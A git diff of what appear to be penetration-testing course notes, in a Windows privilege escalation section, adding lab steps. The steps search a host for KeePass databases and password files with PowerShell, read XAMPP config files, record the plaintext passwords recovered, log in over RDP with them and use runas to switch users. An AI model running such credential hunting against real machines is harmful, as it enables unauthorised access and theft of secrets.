@@ -1095,8 +1095,24 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     RDP connection on port 3389 from 192.168.48.3
     KeePass Password Manager, 7Zip, and XAMPP are installed
     ```
-  - ddd
-- dd  
+- Hidden in Plain View
+  - Searching for password manager databases on the C:\ drive
+    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+  - Searching for sensitive information in XAMPP directory > passwords.txt, my.ini
+    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+  - review the files
+    `type C:\xampp\passwords.txt` `type C:\xampp\mysql\bin\my.ini`
+  - Searching for text files and password manager databases in the home directory of dave > asdf.txt > password: securityIsNotAnOption++++++
+    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
+  - check local group user 'dave' > Remote Desktop Users, helpdesk, Remote Management Use
+    `net user steve`
+  - connect to CLIENTWK220 with RDP as steve `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`
+  - `type C:\xampp\mysql\bin\my.ini` > contents of the my.ini file > MySQL password: admin123admin123!
+  - check local group user 'backupadmin' > not a member of 'remote desktop users' or 'remote management users'
+    `net user backupadmin`
+  - Using Runas to execute cmd as user backupadmin
+    `runas /user:backupadmin cmd`
+- dd  Searching for text files and password manager databases in the home directory of dave
 ### 18. Linux privilege escalation
 ### 19. Port redirection and SSH tunneling
 ### 20. Tunneling through deep packet inspectation
